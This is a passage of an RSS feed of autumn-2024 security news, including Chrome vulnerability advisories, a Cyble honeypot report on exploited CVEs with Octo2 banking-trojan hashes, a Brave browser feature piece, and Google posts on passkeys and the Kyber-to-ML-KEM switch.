<p>The popular generative AI revolution began in November 2022 and resulted in big hardware changes to accommodate power-hungry AI use cases. The recent accommodation of AI in hardware is just the beginning, no doubt. We can look forward to AI-specific hardware trickling down beyond PCs and phones and into wearables, Internet of Things devices and more.</p>

<p>The post <a href="https://securityintelligence.com/articles/trends-hardware-gets-ai-updates-2024/" rel="nofollow">Trends: Hardware gets AI updates in 2024</a> appeared first on <a href="https://securityintelligence.com" rel="nofollow">Security Intelligence</a>.</p>
]]></content:encoded>
<pubDate>Thu, 03 Oct 2024 13:00:00 +0000</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-109</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-109</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 02 Oct 2024 02:29:10 -0400</pubDate>
</item>
<item>
<title>Cyble Honeypot Sensors Detect WordPress Plugin Attack, New Banking Trojan</title>
<link>https://cyble.com/blog/cyble-honeypot-sensors-detect-wordpress-plugin-attack-new-banking-trojan/</link>
<guid>https://cyble.com/blog/cyble-honeypot-sensors-detect-wordpress-plugin-attack-new-banking-trojan/</guid>
<content:encoded><![CDATA[
<p><img alt="Cyble-Blogs-Honeypots-Sensors" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="480" src="https://cyble.com/wp-content/uploads/2024/10/Cyble-Blogs-Honeypots-Sensors.png" tabindex="0" width="960" /></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key Takeaways</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Cyble’s Threat Hunting Honeypot sensors detected five recent vulnerabilities under active exploitation, including newly identified attacks against WordPress plugins.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>A new <a href="https://cyble.com/?s=banking+trojan">banking trojan</a> is engaged in active attacks in Europe and is expected to spread to other regions.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Of more than 400 identified scam email addresses discovered, six in particular stand out.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Commonly targeted ports have been identified and should be blocked by security teams.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://cyble.com/products/cyble-vision/">Cyble's</a>&nbsp;Threat Hunting service this week discovered multiple instances of exploit attempts, <a href="https://cyble.com/knowledge-hub/what-is-malware/">malware</a> intrusions, financial&nbsp;fraud,&nbsp;and brute-force attacks via its network of Honeypot sensors.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>In the week of Sept. 18-24, Cyble researchers identified five recent active exploits, including new <a href="https://cyble.com/knowledge-hub/what-is-a-cyber-attack/">attacks</a> against WordPress plugins, a new malware variant targeting the banking industry, more than 400 new spam email addresses, and thousands of brute-force attacks.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Vulnerability Exploits</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble sensors detected five recent <a href="https://cyble.com/?s=vulnerabilities">vulnerabilities</a> under active exploitation, in addition to a number of older vulnerabilities being actively exploited:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Case 1: SQL Injection Attack</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27956" rel="noreferrer noopener" target="_blank">CVE-2024-27956</a> is a 9.9-severity improper neutralization of Special Elements used in an SQL Command vulnerability in ValvePress Automatic WordPress plugins that allows for SQL Injection attacks. This issue affects Automatic: from n/a through 3.92.0.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Case 2: PHP CGI Argument Injection Vulnerability</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4577" rel="noreferrer noopener" target="_blank">CVE-2024-4577</a> is a 9.8-severity PHP vulnerability that impacts CGI configurations and has been under attack since it was announced in June. It enables attackers to execute arbitrary commands through specially crafted URL parameters. It affects PHP versions&nbsp;8.1.* before 8.1.29; 8.2.* before 8.2.20; and 8.3.* before 8.3.8, when using Apache and PHP-CGI on Windows.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Case 3: GeoServer Vulnerability Allows Remote Code Execution via Unsafe XPath Evaluation</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36401" rel="noreferrer noopener" target="_blank">CVE-2024-36401</a> is a 9.8-severity RCE vulnerability in GeoServer versions prior to 2.23.6, 2.24.4, and 2.25.2. The flaw arises from the unsafe evaluation of OGC request parameters as XPath expressions, allowing unauthenticated users to execute arbitrary code on default installations. The issue affects all GeoServer instances due to improper handling of simple feature types. Patches are available, and a workaround involves removing the vulnerable gt-complex library, which may impact functionality.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Case 4: Network Command Injection Vulnerability Without Authentication</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7029" rel="noreferrer noopener" target="_blank">CVE-2024-7029</a> is an 8.7-severity AVTECH IP camera vulnerability that allows remote attackers to inject and execute commands over the network without requiring authentication. This critical flaw poses a significant risk, enabling unauthorized control over affected systems.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Case 5: Network Command Injection Vulnerability Without Authentication</strong>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The porte_plume plugin used by SPIP before 4.30-alpha2, 4.2.13, and 4.1.16 is vulnerable to a 9.8-severity arbitrary code execution vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7954" rel="noreferrer noopener" target="_blank">CVE-2024-7954</a>). A remote and unauthenticated attacker can execute arbitrary PHP as the SPIP user by sending a crafted HTTP request.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Octo2: New Malware Variant Targets European Banks in Active Attacks</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Octo2, a new variant of the Octo mobile banking trojan, was <a href="https://www.threatfabric.com/blogs/octo2-european-banks-already-under-attack-by-new-malware-variant">recently discovered</a> in European bank attacks, and deployment in other global regions is expected to follow.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Octo (also known as ExobotCompact) has emerged as one of the most prominent malware families in the mobile <a href="https://cyble.com/resources/research-reports/apt-threat-landscape-report-h1-2024/">threat landscape</a>, leading in the number of unique samples detected this year. Recently, a new variant named "Octo2," created by the original <a href="https://cyble.com/knowledge-hub/cyber-threat-actor-and-types/">threat actor</a>, has been discovered, signaling a potential shift in the actors' tactics and strategies. This upgraded version enhances the malware’s remote action capabilities, particularly for Device Takeover attacks, ensuring greater stability in execution. New Octo2 campaigns have already been observed targeting several European countries. Additionally, Octo2 employs advanced obfuscation techniques to evade detection, including the introduction of a Domain Generation Algorithm (DGA), further bolstering its ability to remain hidden from security systems.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Here are known hashes and IoCs, via Threat Fabric:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>Hash (SHA256)</strong></td>
<td><strong>app name</strong></td>
<td><strong>package name</strong></td>
</tr>
<tr>
<td>83eea636c3f04ff1b46963680eb4bac7177e77bbc40b0d3426f5cf66a0c647ae</td>
<td>NordVPN</td>
<td>com.handedfastee5</td>
</tr>
<tr>
<td>6cd0fbfb088a95b239e42d139e27354abeb08c6788b6083962943522a870cb98</td>
<td>Europe Enterprise</td>
<td>com.xsusb_restore3</td>
</tr>
<tr>
<td>117aa133d19ea84a4de87128f16384ae0477f3ee9dd3e43037e102d7039c79d9</td>
<td>Google Chrome</td>
<td>com.havirtual06numberresources</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">More Than 400 Scam Email Addresses Detected</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble identified 410 new email addresses used in scam campaigns. Here are six notes:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>E-mail Subject</strong>&nbsp;</td>
<td><strong>Scammers Email ID</strong>&nbsp;</td>
<td><strong>Scam Type</strong>&nbsp;</td>
<td><strong>Description</strong>&nbsp;</td>
</tr>
<tr>
<td>Claim Directives&nbsp;</td>
<td>info@szhualilian.com&nbsp; &nbsp;</td>
<td>Claim Scam&nbsp;</td>
<td>Fake refund against claims&nbsp;</td>
</tr>
<tr>
<td>Dear winner!&nbsp;</td>
<td>info@student.htw-berlin.de&nbsp; &nbsp;</td>
<td>Lottery/Prize Scam&nbsp;</td>
<td>Fake prize winnings to extort money or information&nbsp;</td>
</tr>
<tr>
<td>DONATION NOTICE&nbsp;</td>
<td>m.sharifi@qiau.ac.ir&nbsp; &nbsp;</td>
<td>Donation Scam&nbsp;</td>
<td>Scammers posing as donors to donate money&nbsp;</td>
</tr>
<tr>
<td>INVESTMENT PROPOSAL&nbsp;</td>
<td>Walsh.philip@natwest.co.uk&nbsp; &nbsp;</td>
<td>Investment Scam&nbsp;</td>
<td>Unrealistic investment offers to steal funds or data.&nbsp;</td>
</tr>
<tr>
<td>Order: cleared customs&nbsp;</td>
<td>support@ip.linodeusercontent.com&nbsp; &nbsp;</td>
<td>Shipping Scam&nbsp;</td>
<td>Unclaimed shipment trick to demand fees or details&nbsp;</td>
</tr>
<tr>
<td>UN Compensation Fund&nbsp;</td>
<td>info@usa.com&nbsp;</td>
<td>Government Organization Scam&nbsp;</td>
<td>Fake UN compensation to collect financial details&nbsp;</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Brute-Force Attack Ports Identified</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Of the thousands of brute-force attacks identified by Cyble, the following targeted ports stand out as meriting attention.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Based on a close inspection of the distribution of attacked ports based on the top five attacker countries, Cyble noticed attacks originating from the <a href="https://cyble.com/resources/research-reports/us-election-security-2024-threats/">United States</a> are targeting ports 22 (40%), 3389 (32%), 445 (21%), 23 (4%), and 80(3%). Attacks originating from Turkey are targeting ports 3389 (100%). Russia, China, and Bulgaria mainly targeted ports 5900 and 445.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Security Analysts are advised to add security system blocks for the attacked ports (such as 22, 3389, 443, 445, 5900, and 3306).</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Cyble Recommendations</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble researchers recommend the following security controls:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Blocking target hashes, URLs, and email info on security systems (Cyble clients received a separate IoC list).</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Immediately patch all open vulnerabilities listed here and routinely monitor the top Suricata alerts in internal networks.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Constantly check for Attackers' ASNs and IPs.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Block Brute Force attack IPs and the targeted ports listed.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Immediately reset default usernames and passwords to mitigate brute-force attacks and enforce periodic changes.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>For servers, set up strong passwords that are difficult to guess.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p>The post <a href="https://cyble.com/blog/cyble-honeypot-sensors-detect-wordpress-plugin-attack-new-banking-trojan/" rel="nofollow">Cyble Honeypot Sensors Detect WordPress Plugin Attack, New Banking Trojan</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Tue, 01 Oct 2024 05:37:01 +0000</pubDate>
</item>
<item>
<title>Google Patches Another Zero-Day <b>Vulnerability</b> in Chrome - MSN</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.msn.com/en-us/news/technology/google-patches-another-zero-day-vulnerability-in-chrome/ar-AA1pycDv%3Focid%3DBingNewsVerp&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3_djzchu412jNJrO4yL2nQ</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.msn.com/en-us/news/technology/google-patches-another-zero-day-vulnerability-in-chrome/ar-AA1pycDv%3Focid%3DBingNewsVerp&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3_djzchu412jNJrO4yL2nQ</guid>
<content:encoded><![CDATA[
Google has fixed the <b>vulnerability</b> in Chrome version 128.0.6613.84/.85 for Windows and <b>macOS</b> systems and version 128.0.6613.84 for Linux users.
]]></content:encoded>
<pubDate>2024-09-27T21:00:15Z</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-103</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-103</guid>
<content:encoded><![CDATA[
<p><span style="color: black;">Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</span></p>
]]></content:encoded>
<pubDate>Wed, 25 Sep 2024 20:20:24 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-104</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-104</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 24 Sep 2024 21:34:16 -0400</pubDate>
</item>
<item>
<title>Brave Browser: The Secure and Private Way to Surf the Web</title>
<link>https://www.cysecurity.news/2024/09/brave-browser-secure-and-private-way-to.html</link>
<guid>https://www.cysecurity.news/2024/09/brave-browser-secure-and-private-way-to.html</guid>
<content:encoded><![CDATA[
<p style="text-align: justify;">&nbsp;</p><p style="text-align: justify;"><br /></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirhsn13WVdfFYS6AOzazfUJXc8nwAL9ywogkZ1qJ837zMLNE4GS3W9c8j6mPQEp1da7iaA6KyVSBuEw2AYBWyrXvYfrBrN1J6N5ifSrZv_h1gwVcFnLy2A3NDWdfeHFn2CS6x-IqCrRqR7P_lnQY8R3rPceDxxqKHWRJCH769dRnnLD42ummbS8g_yCNNm/s1280/eye-5814967_1280.webp" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="426" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirhsn13WVdfFYS6AOzazfUJXc8nwAL9ywogkZ1qJ837zMLNE4GS3W9c8j6mPQEp1da7iaA6KyVSBuEw2AYBWyrXvYfrBrN1J6N5ifSrZv_h1gwVcFnLy2A3NDWdfeHFn2CS6x-IqCrRqR7P_lnQY8R3rPceDxxqKHWRJCH769dRnnLD42ummbS8g_yCNNm/w640-h426/eye-5814967_1280.webp" width="640" /></a></div><p style="text-align: justify;"><br /></p><p style="text-align: justify;">Data is more precious in today's digital world than ever. Companies are trying to collect as much as possible to sell it to third-party data brokers. Cybercrime is growing steadily and targeting unsuspecting victims. Addressing both issues is one of the reasons the more mindful browser, Brave, is integrating an array of features to keep data secure and private.</p><p style="text-align: justify;">Another feature that differentiates Brave is that it has a built-in use of Brave Shields- the application engaged in blocking harmful elements that may track the behaviour of your browsing. In other types of browsers, users have to install third-party ad blockers. Brave Shields are installed directly in the browser and prevent intrusive ads and trackers from retrieving data regarding the activities you perform online.</p><p style="text-align: justify;">It also solves a very common problem with ad blockers, which is that some websites break when the ads are blocked. To solve this issue, Brave replaces tracking codes with privacy-friendly alternatives while ensuring that the integrity of the webpage is maintained and your data is kept secure. As companies continue to devise new ways to hide trackers, Brave is countering this through CNAME uncloaking techniques by uncovering such hidden threats before they manage to collect data from you.</p><p style="text-align: justify;"><b>Blocking Cross-Site Cookies</b></p><p style="text-align: justify;">Cookies are small files that download onto your computer, which track your surfing and, more often than not, targeted advertisements will follow you around the web. Cross-site cookies are blocked, by default, on Brave so websites cannot track movements from one site to the other. Brave provides temporary cookies for functionality, though without exposing any private data, for the occasional cookie-dependent website.</p><p style="text-align: justify;"><b>Phishing Protection with Google Safe Browsing</b></p><p style="text-align: justify;">Though it puts much emphasis on privacy, Brave remembers security. It uses Google Safe Browsing, which won't enable a user to reach a phishing site or download harmful files. Being built upon Chromium, the same platform that Google Chrome runs on, Brave ensures users protection from known threats to their developers, hence making browsing safer.</p><p style="text-align: justify;">While Google Safe Browsing is a service that compromises privacy within Google Chrome, it only serves Brave to block harmful websites without the collection of any personal data from browsing.</p><p style="text-align: justify;"><b>A Search Engine Respecting Your Privacy</b></p><p style="text-align: justify;">Most search engines log your search history, accumulating information about the queries you made and selling that information to customise ads or even sell. In contrast, Brave Search does not collect, store, or share search queries when accessed through the browser. This is a completely private browser that does not believe in logging and selling your browsing habits. Additionally, Brave Search serves less biased results because it crawls the web itself rather than prioritising by SEO schemes or the behaviour of prior users.</p><p style="text-align: justify;">Another advantage of Brave Search is that it can be utilised independently of the download of the Brave browser – so anyone can have private searches.</p><p style="text-align: justify;"><b>Inbuilt VPN and Firewall</b></p><p style="text-align: justify;">It also has a built-in VPN and firewall from Brave, that's available on free trial for seven days, after which you can subscribe to it at $9.99 a month. This will ensure your activity is completely hidden from all the potential threats looking at you, and you won't let any malicious content get inside or leave your network. A VPN encrypts internet traffic so nobody can track your activity online, while the firewall keeps unwanted data from appearing in your system.</p><p style="text-align: justify;">It's probably refreshing about Brave, considering it is committed to protecting personal data. Most companies have either policies or strategies that collect and sell a user's data. With Brave, what is striking is the no-sharing policy, full compliance with the General Data Protection Regulation (GDPR) in Europe and the California Consumer Privacy Act (CCPA), and as such, all users' benefit from strong data protection law, irrespective of their region.</p><p style="text-align: justify;">For people who place importance on privacy and safety, Brave is a full answer. This is because the provider separates itself from the rest of the browsers by its focus on protecting the user from risks connected with the misuse of data or cybercrime through features like Brave Shields, cross-site cookie blocking, private search options, and built-in VPN and firewall services. These have extended to ensure that your web experience remains secure and private; from stopping trackers, malicious websites, and unwanted ads.</p><p style="text-align: justify;"><br /></p>
]]></content:encoded>
<pubDate>2024-09-23T11:08:14.164-04:00</pubDate>
</item>
<item>
<title>Chrome Users Can Now Sync Passkeys Across Devices with New Google PIN Feature</title>
<link>https://thehackernews.com/2024/09/chrome-users-can-now-sync-passkeys.html</link>
<guid>https://thehackernews.com/2024/09/chrome-users-can-now-sync-passkeys.html</guid>
<content:encoded><![CDATA[
Google on Thursday unveiled a Password Manager PIN to let Chrome web users sync their passkeys across Windows, macOS, Linux, ChromeOS, and Android devices.
"This PIN adds an additional layer of security to ensure your passkeys are end-to-end encrypted and can't be accessed by anyone, not even Google," Chrome product manager Chirag Desai said.
The PIN is a six-digit code by default, although it's
]]></content:encoded>
<pubDate>Fri, 20 Sep 2024 11:03:00 +0530</pubDate>
</item>
<item>
<title>Chrome Introduces One-Time Permissions and Enhanced Safety Check for Safer Browsing</title>
<link>https://thehackernews.com/2024/09/chrome-introduces-one-time-permissions.html</link>
<guid>https://thehackernews.com/2024/09/chrome-introduces-one-time-permissions.html</guid>
<content:encoded><![CDATA[
Google has announced that it's rolling out a new set of features to its Chrome browser that gives users more control over their data when surfing the internet and protects them against online threats.
"With the newest version of Chrome, you can take advantage of our upgraded Safety Check, opt out of unwanted website notifications more easily and grant select permissions to a site for one time
]]></content:encoded>
<pubDate>Wed, 18 Sep 2024 14:34:00 +0530</pubDate>
</item>
<item>
<title>A new path for Kyber on the web</title>
<link>http://security.googleblog.com/2024/09/a-new-path-for-kyber-on-web.html</link>
<guid>http://security.googleblog.com/2024/09/a-new-path-for-kyber-on-web.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by David Adrian, David Benjamin, Bob Beck & Devon O'Brien, Chrome Team</span>

<p>
We previously posted about <a href="https://blog.chromium.org/2023/08/protecting-chrome-traffic-with-hybrid.html">experimenting</a> with a hybrid post-quantum key exchange, and <a href="https://blog.chromium.org/2024/05/advancing-our-amazing-bet-on-asymmetric.html">enabling it</a> for 100% of Chrome Desktop clients. The hybrid key exchange used both the pre-quantum X25519 algorithm, and the new post-quantum algorithm Kyber. At the time, the NIST standardization process for Kyber had not yet finished.
</p>
<p>
Since then, the Kyber algorithm has been standardized with minor technical changes and renamed to the <a href="https://security.googleblog.com/2024/08/post-quantum-cryptography-standards.html">Module Lattice Key Encapsulation Mechanism</a> (ML-KEM). We have implemented ML-KEM in Google’s cryptography library, <a href="https://boringssl.googlesource.com/boringssl">BoringSSL</a>, which allows for it to be deployed and utilized by services that depend on this library.
</p>
<p>
The changes to the final version of ML-KEM make it incompatible with the previously deployed version of Kyber.  As a result, the codepoint in TLS for hybrid post-quantum key exchange is changing from 0x6399 for Kyber768+X25519, to 0x11EC for <a href="https://datatracker.ietf.org/doc/draft-kwiatkowski-tls-ecdhe-mlkem/02/">ML-KEM768+X25519</a>. To handle this, we will be making the following changes in Chrome 131<sup id="fnref1"><a href="#fn1" rel="footnote">1</a></sup>:
</p>
<ul>

<li>Chrome will switch from supporting Kyber to ML-KEM

<li>Chrome will offer a key share prediction for hybrid ML-KEM (codepoint 0x11EC)

<li>The PostQuantumKeyAgreementEnabled flag and <a href="https://chromeenterprise.google/policies/#PostQuantumKeyAgreementEnabled">enterprise policy</a> will apply to both Kyber and ML-KEM

<li>Chrome will no longer support hybrid Kyber (codepoint 0x6399)
</li>
</ul>
<p>
Chrome will not support Kyber and ML-KEM at the same time. We made this decision for several reasons:
</p>
<ol>

<li>Kyber was always experimental, so we think continuing to support it risks ossification on non-standard algorithms.

<li>Post-quantum cryptography is <a href="https://dadrian.io/blog/posts/pqc-signatures-2024/">too big</a> to be able to offer two post-quantum key share predictions at the same time.

<li>Server operators can temporarily support both algorithms at the same time to maintain post-quantum security with a broader set of clients, as they update over time.
</li>
</ol>
<p>
We do not want to regress any clients’ post-quantum security, so we are waiting until Chrome 131 to make this change so that server operators have a chance to update their implementations.
</p>
<p>
Longer term, we hope to avoid the chicken-and-egg problem for post-quantum key share predictions through our <a href="https://datatracker.ietf.org/doc/draft-ietf-tls-key-share-prediction/">emerging IETF draft for key share prediction</a>. This allows servers to broadcast what algorithms they support in DNS, so that clients can predict a key share that a server is known to support. This avoids the risk of an extra round trip, which can be particularly costly when using large post-quantum algorithms.
</p>
<p>
We’re excited to continue to improve security for Chrome users, against both current and future computers.
</p>

<!-- Footnotes themselves at the bottom. -->

<h2>Notes</h2>
<div class="footnotes">
<hr />
<ol><li id="fn1">
<p>
     Chrome Canary, Dev, and Beta may see these changes prior to Chrome 131.&nbsp;<a href="#fnref1" rev="footnote">&#8617;</a>

</ol></div>
]]></content:encoded>
<pubDate>2024-09-13T12:04:12.571-04:00</pubDate>
</item>
<item>
<title>New Chrome Features Protect Users Against Threats, Provide More Control Over Personal Data</title>
<link>https://www.securityweek.com/new-chrome-features-protect-users-against-threats-provide-more-control-over-personal-data/</link>
<guid>https://www.securityweek.com/new-chrome-features-protect-users-against-threats-provide-more-control-over-personal-data/</guid>
<content:encoded><![CDATA[
<p>Google is rolling out new features in Chrome to better protect users online and to improve their control over personal data.</p>
<p>The post <a href="https://www.securityweek.com/new-chrome-features-protect-users-against-threats-provide-more-control-over-personal-data/">New Chrome Features Protect Users Against Threats, Provide More Control Over Personal Data</a> appeared first on <a href="https://www.securityweek.com">SecurityWeek</a>.</p>
]]></content:encoded>
<pubDate>Thu, 12 Sep 2024 16:01:00 +0000</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-101</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-101</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 11 Sep 2024 15:52:43 -0400</pubDate>
</item>
<item>
<title>Ivanti Releases Security Updates for Critical RCE Flaw in Endpoint Management Software</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.technadu.com/ivanti-releases-fix-for-critical-rce-flaw/548815/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1de8kH0HVkW4X_cWTULeqI</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.technadu.com/ivanti-releases-fix-for-critical-rce-flaw/548815/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1de8kH0HVkW4X_cWTULeqI</guid>
<content:encoded><![CDATA[
... <b>macOS</b>, and Chrome OS. A critical remote code execution (RCE) <b>vulnerability</b> in the Ivanti Endpoint Management software (EPM) was addressed by the&nbsp;...
]]></content:encoded>
<pubDate>2024-09-11T14:29:49Z</pubDate>
</item>
<item>
<title>Chrome 128 Update Resolves High-Severity Vulnerabilities</title>
<link>https://www.securityweek.com/chrome-128-update-resolves-high-severity-vulnerabilities/</link>
<guid>https://www.securityweek.com/chrome-128-update-resolves-high-severity-vulnerabilities/</guid>
<content:encoded><![CDATA[
<p>Google has released a Chrome 128 security update to resolve high-severity memory safety vulnerabilities.</p>
<p>The post <a href="https://www.securityweek.com/chrome-128-update-resolves-high-severity-vulnerabilities/">Chrome 128 Update Resolves High-Severity Vulnerabilities</a> appeared first on <a href="https://www.securityweek.com">SecurityWeek</a>.</p>
]]></content:encoded>
<pubDate>Wed, 11 Sep 2024 08:34:22 +0000</pubDate>
</item>
<item>
<title>Weekly IT Vulnerability Report for August 28, 2024 – September 03, 2024</title>
<link>https://cyble.com/blog/weekly-it-vulnerability-report-for-august-28-2024-september-03-2024/</link>
<guid>https://cyble.com/blog/weekly-it-vulnerability-report-for-august-28-2024-september-03-2024/</guid>
<content:encoded><![CDATA[
